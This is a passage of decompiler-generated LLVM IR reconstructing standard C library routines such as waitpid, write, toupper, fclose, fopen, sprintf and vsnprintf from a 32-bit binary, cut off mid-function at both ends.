  %v0_8049f1c = phi i32 [ %v2_8049f04, %entry ], [ -1, %dec_label_pc_8049f10 ]
  %v2_8049f20 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049f20, i32* @edi, align 4
  ret i32 %v0_8049f1c

; uselistorder directives
  uselistorder i32 %v2_8049f04, { 1, 0, 2 }
  uselistorder i32 %v0_8049efc, { 1, 0 }
  uselistorder label %dec_label_pc_8049f1c, { 1, 0 }
}

define i32 @__libc_waitpid() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v4_8049f35 = call i32 @wait4(i32 %tmp, i32 %tmp1, i32 %tmp2, i32 0)
  ret i32 %v4_8049f35
}

define i32 @__libc_write(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049f40 = load i32, i32* @edi, align 4
  store i32 %v0_8049f40, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8049f50 = load i32, i32* @ebx, align 4
  %v4_8049f58 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8049f50, i32* @ebx, align 4
  store i32 %v4_8049f58, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v4_8049f58, -4095
  br i1 %tmp11, label %dec_label_pc_8049f70, label %dec_label_pc_8049f64

dec_label_pc_8049f64:                             ; preds = %entry
  %v1_8049f64 = call i32 @__errno_location(i32 %v0_8049f50)
  %v0_8049f69 = load i32, i32* %edi.global-to-local, align 4
  %v1_8049f69 = sub i32 0, %v0_8049f69
  %v2_8049f6b = inttoptr i32 %v1_8049f64 to i32*
  store i32 %v1_8049f69, i32* %v2_8049f6b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8049f70

dec_label_pc_8049f70:                             ; preds = %entry, %dec_label_pc_8049f64
  %v0_8049f70 = phi i32 [ %v4_8049f58, %entry ], [ -1, %dec_label_pc_8049f64 ]
  %v2_8049f72 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049f72, i32* @edx, align 4
  %v2_8049f74 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049f74, i32* @edi, align 4
  ret i32 %v0_8049f70

; uselistorder directives
  uselistorder i32 %v4_8049f58, { 1, 0, 2 }
  uselistorder i32 %v0_8049f50, { 1, 0 }
  uselistorder label %dec_label_pc_8049f70, { 1, 0 }
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8049f7c = add i32 %arg1, 128
  %v6_8049f87 = icmp ugt i32 %v1_8049f7c, 383
  br i1 %v6_8049f87, label %dec_label_pc_8049f92, label %dec_label_pc_8049f89

dec_label_pc_8049f89:                             ; preds = %entry
  %v0_8049f89 = load i32, i32* inttoptr (i32 134561980 to i32*), align 4
  %v2_8049f8e = mul i32 %arg1, 2
  %v3_8049f8e = add i32 %v0_8049f89, %v2_8049f8e
  %v4_8049f8e = inttoptr i32 %v3_8049f8e to i16*
  %v5_8049f8e = load i16, i16* %v4_8049f8e, align 2
  %v6_8049f8e = sext i16 %v5_8049f8e to i32
  br label %dec_label_pc_8049f92

dec_label_pc_8049f92:                             ; preds = %entry, %dec_label_pc_8049f89
  %v0_8049f92 = phi i32 [ %arg1, %entry ], [ %v6_8049f8e, %dec_label_pc_8049f89 ]
  ret i32 %v0_8049f92

; uselistorder directives
  uselistorder label %dec_label_pc_8049f92, { 1, 0 }
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_80569e0.312 to i32)
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8049fa0 = load i32, i32* @ebp, align 4
  %v0_8049fa1 = load i32, i32* @edi, align 4
  %v0_8049fa2 = load i32, i32* @esi, align 4
  %v0_8049fa3 = load i32, i32* @ebx, align 4
  %v4_8049fa7 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8049fa7, i32* @esi, align 4
  %v1_8049fab = add i32 %v4_8049fa7, 52
  %v2_8049fab = inttoptr i32 %v1_8049fab to i32*
  %v3_8049fab = load i32, i32* %v2_8049fab, align 4
  store i32 %v3_8049fab, i32* @ebp, align 4
  %v1_8049fae = icmp eq i32 %v3_8049fab, 0
  %v1_8049fb0 = icmp eq i1 %v1_8049fae, false
  br i1 %v1_8049fb0, label %dec_label_pc_8049fd1, label %dec_label_pc_8049fb2

dec_label_pc_8049fb2:                             ; preds = %entry
  %v1_8049fb2 = add i32 %v4_8049fa7, 56
  store i32 %v1_8049fb2, i32* @ebx, align 4
  %v2_8049fbc = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8049fbc, i32* @eax, align 4
  %v2_8049fc1 = call i32 @__pthread_return_void(i32 %v2_8049fbc, i32 134534955)
  %v0_8049fc6 = load i32, i32* @ebx, align 4
  %v1_8049fc9 = call i32 @__pthread_return_0(i32 %v0_8049fc6)
  store i32 %v1_8049fc9, i32* @eax, align 4
  %v0_8049fd3.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8049fd1

dec_label_pc_8049fd1:                             ; preds = %entry, %dec_label_pc_8049fb2
  %v0_8049fdb = phi i32 [ %v4_8049fa7, %entry ], [ %v0_8049fd3.pre, %dec_label_pc_8049fb2 ]
  store i32 0, i32* @edi, align 4
  %v1_8049fd3 = inttoptr i32 %v0_8049fdb to i8*
  %v2_8049fd3 = load i8, i8* %v1_8049fd3, align 1
  %v3_8049fd3 = and i8 %v2_8049fd3, 64
  %v4_8049fd3 = icmp eq i8 %v3_8049fd3, 0
  br i1 %v4_8049fd3, label %dec_label_pc_8049fd1.dec_label_pc_8049fe6_crit_edge, label %dec_label_pc_8049fd8

dec_label_pc_8049fd1.dec_label_pc_8049fe6_crit_edge: ; preds = %dec_label_pc_8049fd1
  br label %dec_label_pc_8049fe6

dec_label_pc_8049fd8:                             ; preds = %dec_label_pc_8049fd1
  %v1_8049fdc = inttoptr i32 %v0_8049fdb to i16*
  %v2_8049fdc = call i32 @fflush_unlocked(i16* %v1_8049fdc)
  store i32 %v2_8049fdc, i32* @edi, align 4
  %v0_8049fe9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8049fe6

dec_label_pc_8049fe6:                             ; preds = %dec_label_pc_8049fd1.dec_label_pc_8049fe6_crit_edge, %dec_label_pc_8049fd8
  %v0_8049fe9 = phi i32 [ %v0_8049fdb, %dec_label_pc_8049fd1.dec_label_pc_8049fe6_crit_edge ], [ %v0_8049fe9.pre, %dec_label_pc_8049fd8 ]
  %v1_8049fe9 = add i32 %v0_8049fe9, 4
  %v2_8049fe9 = inttoptr i32 %v1_8049fe9 to i32*
  %v3_8049fe9 = load i32, i32* %v2_8049fe9, align 4
  %v1_8049fec = call i32 @__libc_close(i32 %v3_8049fe9)
  store i32 %v1_8049fec, i32* @eax, align 4
  %v2_8049ff4 = icmp slt i32 %v1_8049fec, 0
  %v1_8049ff6 = icmp eq i1 %v2_8049ff4, false
  br i1 %v1_8049ff6, label %dec_label_pc_8049ffb, label %dec_label_pc_8049ff8

dec_label_pc_8049ff8:                             ; preds = %dec_label_pc_8049fe6
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_8049ffb

dec_label_pc_8049ffb:                             ; preds = %dec_label_pc_8049fe6, %dec_label_pc_8049ff8
  %v0_8049ffb = load i32, i32* @esi, align 4
  %v1_8049ffb = add i32 %v0_8049ffb, 4
  %v2_8049ffb = inttoptr i32 %v1_8049ffb to i32*
  store i32 -1, i32* %v2_8049ffb, align 4
  %v2_804a00d = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804a00d, i32* @ebx, align 4
  %v2_804a012 = call i32 @__pthread_return_void(i32 %v2_804a00d, i32 134534955)
  %v1_804a01e = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80540f0.313 to i32))
  %v0_804a023 = load i32, i32* @global_var_80547a4.314, align 4
  %v1_804a028 = add i32 %v0_804a023, 1
  store i32 %v1_804a028, i32* @global_var_80547a4.314, align 4
  store i32 ptrtoint (i32* @global_var_80540f0.313 to i32), i32* @eax, align 4
  %v2_804a033 = call i32 @__pthread_return_void(i32 %v2_804a00d, i32 1)
  store i32 %v2_804a033, i32* @eax, align 4
  %v0_804a03b = load i32, i32* @esi, align 4
  %v1_804a03b = inttoptr i32 %v0_804a03b to i16*
  %v2_804a03b = load i16, i16* %v1_804a03b, align 2
  %v3_804a03b = and i16 %v2_804a03b, 24576
  store i16 %v3_804a03b, i16* %v1_804a03b, align 2
  %v0_804a040 = load i32, i32* @esi, align 4
  %v1_804a040 = inttoptr i32 %v0_804a040 to i16*
  %v2_804a040 = load i16, i16* %v1_804a040, align 2
  %v3_804a040 = or i16 %v2_804a040, 48
  store i16 %v3_804a040, i16* %v1_804a040, align 2
  br i1 %v1_8049fb0, label %dec_label_pc_804a059, label %dec_label_pc_804a048

dec_label_pc_804a048:                             ; preds = %dec_label_pc_8049ffb
  %v2_804a04c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804a04c, i32* @eax, align 4
  %v2_804a051 = call i32 @__pthread_return_void(i32 %v2_804a04c, i32 1)
  store i32 %v2_804a051, i32* @eax, align 4
  br label %dec_label_pc_804a059

dec_label_pc_804a059:                             ; preds = %dec_label_pc_8049ffb, %dec_label_pc_804a048
  %v0_804a059 = load i32, i32* @esi, align 4
  %v1_804a059 = add i32 %v0_804a059, 1
  %v2_804a059 = inttoptr i32 %v1_804a059 to i8*
  %v3_804a059 = load i8, i8* %v2_804a059, align 1
  %v4_804a059 = and i8 %v3_804a059, 64
  %v5_804a059 = icmp eq i8 %v4_804a059, 0
  br i1 %v5_804a059, label %dec_label_pc_804a06d, label %dec_label_pc_804a05f

dec_label_pc_804a05f:                             ; preds = %dec_label_pc_804a059
  %v1_804a062 = add i32 %v0_804a059, 8
  %v2_804a062 = inttoptr i32 %v1_804a062 to i32*
  %v3_804a062 = load i32, i32* %v2_804a062, align 4
  %v1_804a065 = call i32 @free(i32 %v3_804a062)
  store i32 %v1_804a065, i32* @eax, align 4
  br label %dec_label_pc_804a06d

dec_label_pc_804a06d:                             ; preds = %dec_label_pc_804a059, %dec_label_pc_804a05f
  %v2_804a079 = call i32 @__pthread_return_void(i32 %v2_804a00d, i32 134534955)
  %v1_804a085 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80540f0.313 to i32))
  store i32 ptrtoint (i32* @global_var_80540f0.313 to i32), i32* @eax, align 4
  %v0_804a08c = load i32, i32* @global_var_80547a8.315, align 8
  %v1_804a08c = add i32 %v0_804a08c, 1
  store i32 %v1_804a08c, i32* @global_var_80547a8.315, align 8
  %v2_804a095 = call i32 @__pthread_return_void(i32 %v2_804a00d, i32 1)
  %v0_804a09a = call i32 @_stdio_openlist_dec_use()
  %v0_804a0a2 = load i32, i32* @edi, align 4
  store i32 %v0_8049fa3, i32* @ebx, align 4
  store i32 %v0_8049fa2, i32* @esi, align 4
  store i32 %v0_8049fa1, i32* @edi, align 4
  store i32 %v0_8049fa0, i32* @ebp, align 4
  ret i32 %v0_804a0a2

; uselistorder directives
  uselistorder label %dec_label_pc_804a06d, { 1, 0 }
  uselistorder label %dec_label_pc_804a059, { 1, 0 }
  uselistorder label %dec_label_pc_8049ffb, { 1, 0 }
  uselistorder label %dec_label_pc_8049fe6, { 1, 0 }
  uselistorder label %dec_label_pc_8049fd1, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804a0bb = inttoptr i32 %arg2 to i8*
  %v5_804a0bb = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_804a0bb, i32 0, i32 -1)
  ret i32 %v5_804a0bb
}

define i32 @vsprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_804a0d5 = inttoptr i32 %arg1 to i8*
  %v5_804a0d5 = call i32 @__GI_vsnprintf(i8* %v4_804a0d5, i32 -1, i32 %arg2, i32 %arg3)
  ret i32 %v5_804a0d5
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_804a0e3 = ptrtoint i32* %stack_var_12 to i32
  %v4_804a0f6 = inttoptr i32 %arg1 to i8*
  %v5_804a0f6 = call i32 @__GI_vsnprintf(i8* %v4_804a0f6, i32 -1, i32 %arg2, i32 %v2_804a0e3)
  ret i32 %v5_804a0f6
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804a100 = load i32, i32* @ebp, align 4
  %v0_804a101 = load i32, i32* @edi, align 4
  %v0_804a102 = load i32, i32* @esi, align 4
  %v0_804a103 = load i32, i32* @ebx, align 4
  store i32 %v0_804a103, i32* %stack_var_-16, align 4
  %v4_804a107 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804a107, i32* @esi, align 4
  %v2_804a10b = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v2_804a13c = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_804a13c, i32* @ebp, align 4
  %v1_804a140 = sub i32 -1, %v4_804a107
  store i32 %v1_804a140, i32* @ebx, align 4
  %v1_804a143 = call i32 @__stdio_init_mutex(i32 %v2_804a10b)
  %v0_804a153 = load i32, i32* @ebx, align 4
  %v1_804a153 = load i32, i32* @edi, align 4
  %tmp34 = icmp ugt i32 %v0_804a153, %v1_804a153
  br i1 %tmp34, label %dec_label_pc_804a157, label %dec_label_pc_804a159

dec_label_pc_804a157:                             ; preds = %entry
  store i32 %v1_804a153, i32* @ebx, align 4
  br label %dec_label_pc_804a159

dec_label_pc_804a159:                             ; preds = %entry, %dec_label_pc_804a157
  %v1_804a159 = phi i32 [ %v0_804a153, %entry ], [ %v1_804a153, %dec_label_pc_804a157 ]
  %v0_804a159 = load i32, i32* @esi, align 4
  %v2_804a159 = add i32 %v0_804a159, %v1_804a159
  %v4_804a184 = inttoptr i32 %arg3 to i8*
  %v5_804a184 = call i32 @_vfprintf_internal(i32 %v2_804a13c, i8* %v4_804a184, i32 %arg4, i32 %v2_804a159)
  store i32 %v5_804a184, i32* @edx, align 4
  %v0_804a18e = load i32, i32* @ebx, align 4
  %v1_804a18e = icmp eq i32 %v0_804a18e, 0
  br i1 %v1_804a18e, label %dec_label_pc_804a1a8, label %dec_label_pc_804a192

dec_label_pc_804a192:                             ; preds = %dec_label_pc_804a159
  %v16_804a196 = icmp eq i32 %v1_804a159, 0
  %v1_804a19a = icmp eq i1 %v16_804a196, false
  br i1 %v1_804a19a, label %dec_label_pc_804a1a1, label %dec_label_pc_804a19c

dec_label_pc_804a19c:                             ; preds = %dec_label_pc_804a192
  %v1_804a19c = add i32 %v2_804a159, -1
  br label %dec_label_pc_804a1a1

dec_label_pc_804a1a1:                             ; preds = %dec_label_pc_804a192, %dec_label_pc_804a19c
  %stack_var_-80.0.in = phi i32 [ %v0_804a159, %dec_label_pc_804a192 ], [ %v1_804a19c, %dec_label_pc_804a19c ]
  %stack_var_-80.0 = inttoptr i32 %stack_var_-80.0.in to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_804a1ab.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804a1a8

dec_label_pc_804a1a8:                             ; preds = %dec_label_pc_804a159, %dec_label_pc_804a1a1
  %v0_804a1ab = phi i32 [ %v5_804a184, %dec_label_pc_804a159 ], [ %v0_804a1ab.pre, %dec_label_pc_804a1a1 ]
  %v2_804a1ad = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804a1ad, i32* @ebx, align 4
  store i32 %v0_804a102, i32* @esi, align 4
  store i32 %v0_804a101, i32* @edi, align 4
  store i32 %v0_804a100, i32* @ebp, align 4
  ret i32 %v0_804a1ab

; uselistorder directives
  uselistorder i32 %v0_804a159, { 1, 0 }
  uselistorder i32 %v1_804a159, { 1, 0 }
  uselistorder i32 %v1_804a153, { 1, 2, 0 }
  uselistorder i32 %v0_804a153, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder label %dec_label_pc_804a1a8, { 1, 0 }
  uselistorder label %dec_label_pc_804a1a1, { 1, 0 }
  uselistorder label %dec_label_pc_804a159, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804a1b4 = load i32, i32* @ebp, align 4
  %v0_804a1b5 = load i32, i32* @edi, align 4
  %v0_804a1b6 = load i32, i32* @esi, align 4
  %v0_804a1b7 = load i32, i32* @ebx, align 4
  store i32 %v0_804a1b7, i32* %stack_var_-16, align 4
  %v4_804a1bb = ptrtoint i8* %arg2 to i32
  store i32 %v4_804a1bb, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_804a1cb = load i8, i8* %arg2, align 1
  %v3_804a1cb = zext i8 %v2_804a1cb to i32
  %v4_804a1cb = load i32, i32* @eax, align 4
  %v5_804a1cb = and i32 %v4_804a1cb, -256
  %v6_804a1cb = or i32 %v5_804a1cb, %v3_804a1cb
  store i32 %v6_804a1cb, i32* %eax.global-to-local, align 4
  %v10_804a1cd = icmp eq i8 %v2_804a1cb, 114
  br i1 %v10_804a1cd, label %dec_label_pc_804a20f, label %dec_label_pc_804a1d1

dec_label_pc_804a1d1:                             ; preds = %entry
  store i32 577, i32* @ebx, align 4
  %v10_804a1d6 = icmp eq i8 %v2_804a1cb, 119
  br i1 %v10_804a1d6, label %dec_label_pc_804a211, label %dec_label_pc_804a1da

dec_label_pc_804a1da:                             ; preds = %dec_label_pc_804a1d1
  store i32 1089, i32* @ebx, align 4
  %v10_804a1de = icmp eq i8 %v2_804a1cb, 97
  br i1 %v10_804a1de, label %dec_label_pc_804a211, label %dec_label_pc_804a1e2

dec_label_pc_804a1e2:                             ; preds = %dec_label_pc_804a28a, %dec_label_pc_804a264, %dec_label_pc_804a1da
  %v0_804a1e2 = load i32, i32* %stack_var_-16, align 4
  %v1_804a1e2 = call i32 @__errno_location(i32 %v0_804a1e2)
  store i32 %v1_804a1e2, i32* %eax.global-to-local, align 4
  %v0_804a1e7 = load i32, i32* @ebp, align 4
  %v1_804a1e7 = icmp eq i32 %v0_804a1e7, 0
  %v1_804a1e9 = inttoptr i32 %v1_804a1e2 to i32*
  store i32 22, i32* %v1_804a1e9, align 4
  br i1 %v1_804a1e7, label %dec_label_pc_804a3d7, label %dec_label_pc_804a1f5

dec_label_pc_804a1f5:                             ; preds = %dec_label_pc_804a2b3, %dec_label_pc_804a1e2
  %v0_804a1f5 = load i32, i32* @ebp, align 4
  %v1_804a1f5 = add i32 %v0_804a1f5, 1
  %v2_804a1f5 = inttoptr i32 %v1_804a1f5 to i8*
  %v3_804a1f5 = load i8, i8* %v2_804a1f5, align 1
  %v4_804a1f5 = and i8 %v3_804a1f5, 32
  %v5_804a1f5 = icmp eq i8 %v4_804a1f5, 0
  br i1 %v5_804a1f5, label %dec_label_pc_804a3d7, label %dec_label_pc_804a1ff

dec_label_pc_804a1ff:                             ; preds = %dec_label_pc_804a1f5
  store i32 %v0_804a1f5, i32* %stack_var_-76, align 4
  %v1_804a203 = call i32 @free(i32 %v0_804a1f5)
  store i32 %v1_804a203, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804a3d2

dec_label_pc_804a20f:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804a211

dec_label_pc_804a211:                             ; preds = %dec_label_pc_804a1da, %dec_label_pc_804a1d1, %dec_label_pc_804a20f
  %v0_804a222 = phi i32 [ 1089, %dec_label_pc_804a1da ], [ 577, %dec_label_pc_804a1d1 ], [ 1, %dec_label_pc_804a20f ]
  %v1_804a211 = add i32 %v4_804a1bb, 1
  store i32 %v1_804a211, i32* %eax.global-to-local, align 4
  %v2_804a214 = inttoptr i32 %v1_804a211 to i8*
  %v3_804a214 = load i8, i8* %v2_804a214, align 1
  %v12_804a214 = icmp eq i8 %v3_804a214, 98
  br i1 %v12_804a214, label %dec_label_pc_804a21c, label %dec_label_pc_804a21a

dec_label_pc_804a21a:                             ; preds = %dec_label_pc_804a211
  store i32 %v4_804a1bb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a21c

dec_label_pc_804a21c:                             ; preds = %dec_label_pc_804a211, %dec_label_pc_804a21a
  %v0_804a21c = phi i32 [ %v1_804a211, %dec_label_pc_804a211 ], [ %v4_804a1bb, %dec_label_pc_804a21a ]
  %v1_804a21c = add i32 %v0_804a21c, 1
  %v2_804a21c = inttoptr i32 %v1_804a21c to i8*
  %v3_804a21c = load i8, i8* %v2_804a21c, align 1
  %v12_804a21c = icmp eq i8 %v3_804a21c, 43
  %v1_804a220 = icmp eq i1 %v12_804a21c, false
  br i1 %v1_804a220, label %dec_label_pc_804a22a, label %dec_label_pc_804a222

dec_label_pc_804a222:                             ; preds = %dec_label_pc_804a21c
  store i32 %v0_804a222, i32* %eax.global-to-local, align 4
  %v1_804a227 = add nuw nsw i32 %v0_804a222, 1
  store i32 %v1_804a227, i32* @ebx, align 4
  br label %dec_label_pc_804a22a

dec_label_pc_804a22a:                             ; preds = %dec_label_pc_804a21c, %dec_label_pc_804a222
  %v1_804a22a = icmp eq i32 %arg3, 0
  %v1_804a22c = icmp eq i1 %v1_804a22a, false
  br i1 %v1_804a22c, label %dec_label_pc_804a260, label %dec_label_pc_804a22e

dec_label_pc_804a22e:                             ; preds = %dec_label_pc_804a22a
  store i32 80, i32* %stack_var_-76, align 4
  %v1_804a233 = call i32 @malloc(i32 80)
  store i32 %v1_804a233, i32* %eax.global-to-local, align 4
  store i32 %v1_804a233, i32* @ebp, align 4
  %v2_804a23d = icmp eq i32 %v1_804a233, 0
  br i1 %v2_804a23d, label %dec_label_pc_804a3d9, label %dec_label_pc_804a245

dec_label_pc_804a245:                             ; preds = %dec_label_pc_804a22e
  %v2_804a233 = inttoptr i32 %v1_804a233 to i16*
  store i16 8192, i16* %v2_804a233, align 2
  %v2_804a24d = add i32 %v1_804a233, 8
  %v3_804a24d = inttoptr i32 %v2_804a24d to i32*
  store i32 0, i32* %v3_804a24d, align 4
  %v2_804a254 = add i32 %v1_804a233, 56
  store i32 %v2_804a254, i32* %eax.global-to-local, align 4
  store i32 %v2_804a254, i32* %stack_var_-76, align 4
  %v1_804a258 = call i32 @__stdio_init_mutex(i32 %v2_804a254)
  store i32 %v1_804a258, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a260

dec_label_pc_804a260:                             ; preds = %dec_label_pc_804a22a, %dec_label_pc_804a245
  %v2_804a260 = icmp slt i32 %arg4, 0
  br i1 %v2_804a260, label %dec_label_pc_804a2ad, label %dec_label_pc_804a264

dec_label_pc_804a264:                             ; preds = %dec_label_pc_804a260
  %v0_804a264 = load i32, i32* @ebx, align 4
  %v0_804a266 = load i32, i32* @esi, align 4
  %v1_804a266 = add i32 %v0_804a266, 1
  store i32 %v1_804a266, i32* %eax.global-to-local, align 4
  %v1_804a269 = and i32 %v0_804a264, 32771
  store i32 %v1_804a269, i32* %edx.global-to-local, align 4
  %v1_804a26f = load i32, i32* @ebp, align 4
  %v2_804a26f = add i32 %v1_804a26f, 4
  %v3_804a26f = inttoptr i32 %v2_804a26f to i32*
  store i32 %arg4, i32* %v3_804a26f, align 4
  %v0_804a272 = load i32, i32* %edx.global-to-local, align 4
  %v1_804a272 = add i32 %v0_804a272, 1
  store i32 %v1_804a272, i32* @edx, align 4
  %v0_804a273 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a273 = and i32 %v0_804a273, %v1_804a272
  store i32 %v2_804a273, i32* %eax.global-to-local, align 4
  %v12_804a275 = icmp eq i32 %v2_804a273, %v1_804a272
  %v1_804a277 = icmp eq i1 %v12_804a275, false
  br i1 %v1_804a277, label %dec_label_pc_804a1e2, label %dec_label_pc_804a27d

dec_label_pc_804a27d:                             ; preds = %dec_label_pc_804a264
  %v0_804a27d = load i32, i32* @esi, align 4
  %v1_804a27f = and i32 %v0_804a27d, 1024
  %v1_804a281 = xor i32 %v1_804a27f, 1024
  store i32 %v1_804a281, i32* %eax.global-to-local, align 4
  %v1_804a286 = load i32, i32* @ebx, align 4
  %v2_804a286 = and i32 %v1_804a286, %v1_804a281
  %v3_804a286 = icmp eq i32 %v2_804a286, 0
  br i1 %v3_804a286, label %dec_label_pc_804a27d.dec_label_pc_804a2a3_crit_edge, label %dec_label_pc_804a28a

dec_label_pc_804a27d.dec_label_pc_804a2a3_crit_edge: ; preds = %dec_label_pc_804a27d
  br label %dec_label_pc_804a2a3

dec_label_pc_804a28a:                             ; preds = %dec_label_pc_804a27d
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v4_804a293 = call i32 @__libc_fcntl(i32 %arg4, i32 4, i32 1024, i32 %v1_804a281)
  store i32 %v4_804a293, i32* %eax.global-to-local, align 4
  %v1_804a29b = icmp eq i32 %v4_804a293, 0
  %v1_804a29d = icmp eq i1 %v1_804a29b, false
  br i1 %v1_804a29d, label %dec_label_pc_804a1e2, label %dec_label_pc_804a28a.dec_label_pc_804a2a3_crit_edge

dec_label_pc_804a28a.dec_label_pc_804a2a3_crit_edge: ; preds = %dec_label_pc_804a28a
  %v0_804a2a3.pre = load i32, i32* @esi, align 4
  %v0_804a2a9.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804a2a3

dec_label_pc_804a2a3:                             ; preds = %dec_label_pc_804a27d.dec_label_pc_804a2a3_crit_edge, %dec_label_pc_804a28a.dec_label_pc_804a2a3_crit_edge
  %v0_804a2a9 = phi i32 [ %v1_804a286, %dec_label_pc_804a27d.dec_label_pc_804a2a3_crit_edge ], [ %v0_804a2a9.pre, %dec_label_pc_804a28a.dec_label_pc_804a2a3_crit_edge ]
  %v0_804a2a3 = phi i32 [ %v0_804a27d, %dec_label_pc_804a27d.dec_label_pc_804a2a3_crit_edge ], [ %v0_804a2a3.pre, %dec_label_pc_804a28a.dec_label_pc_804a2a3_crit_edge ]
  %v1_804a2a3 = and i32 %v0_804a2a3, 32768
  %v2_804a2a9 = or i32 %v1_804a2a3, %v0_804a2a9
  store i32 %v2_804a2a9, i32* @ebx, align 4
  br label %dec_label_pc_804a2ce

dec_label_pc_804a2ad:                             ; preds = %dec_label_pc_804a260
  %v1_804a2ad = add i32 %arg4, 1
  %v8_804a2ad = icmp eq i32 %v1_804a2ad, 0
  store i32 %v1_804a2ad, i32* @edi, align 4
  %v0_804a2b9.pre = load i32, i32* @ebx, align 4
  br i1 %v8_804a2ad, label %dec_label_pc_804a2b3, label %dec_label_pc_804a2b0

dec_label_pc_804a2b0:                             ; preds = %dec_label_pc_804a2ad
  %v11_804a2b0 = or i32 %v0_804a2b9.pre, 32768
  store i32 %v11_804a2b0, i32* @ebx, align 4
  br label %dec_label_pc_804a2b3

dec_label_pc_804a2b3:                             ; preds = %dec_label_pc_804a2ad, %dec_label_pc_804a2b0
  %v0_804a2b9 = phi i32 [ %v11_804a2b0, %dec_label_pc_804a2b0 ], [ %v0_804a2b9.pre, %dec_label_pc_804a2ad ]
  %v0_804a2ba = load i32, i32* @esi, align 4
  store i32 %v0_804a2ba, i32* %stack_var_-76, align 4
  %v3_804a2bb = inttoptr i32 %v0_804a2ba to i8*
  %v4_804a2bb = call i32 @__libc_open(i8* %v3_804a2bb, i32 %v0_804a2b9, i32 438)
  store i32 %v4_804a2bb, i32* %eax.global-to-local, align 4
  %v1_804a2c3 = load i32, i32* @ebp, align 4
  %v2_804a2c3 = add i32 %v1_804a2c3, 4
  %v3_804a2c3 = inttoptr i32 %v2_804a2c3 to i32*
  store i32 %v4_804a2bb, i32* %v3_804a2c3, align 4
  %v2_804a2c6 = icmp slt i32 %v4_804a2bb, 0
  br i1 %v2_804a2c6, label %dec_label_pc_804a1f5, label %dec_label_pc_804a2ce

dec_label_pc_804a2ce:                             ; preds = %dec_label_pc_804a2b3, %dec_label_pc_804a2a3
  %v0_804a2ce = load i32, i32* @ebp, align 4
  %v1_804a2ce = inttoptr i32 %v0_804a2ce to i16*
  %v2_804a2ce = load i16, i16* %v1_804a2ce, align 2
  %v3_804a2ce = and i16 %v2_804a2ce, 8192
  store i16 %v3_804a2ce, i16* %v1_804a2ce, align 2
  %v0_804a2d4 = load i32, i32* @ebx, align 4
  %v8_804a2d6 = and i32 %v0_804a2d4, -31744
  %v1_804a2db = urem i32 %v0_804a2d4, 4
  %v1_804a2de = add nuw nsw i32 %v1_804a2db, 1
  store i32 %v1_804a2de, i32* %eax.global-to-local, align 4
  %v1_804a2df = load i32, i32* @ebp, align 4
  %v2_804a2df = inttoptr i32 %v1_804a2df to i32*
  %v3_804a2df = load i32, i32* %v2_804a2df, align 4
  %v4_804a2df = or i32 %v3_804a2df, %v8_804a2d6
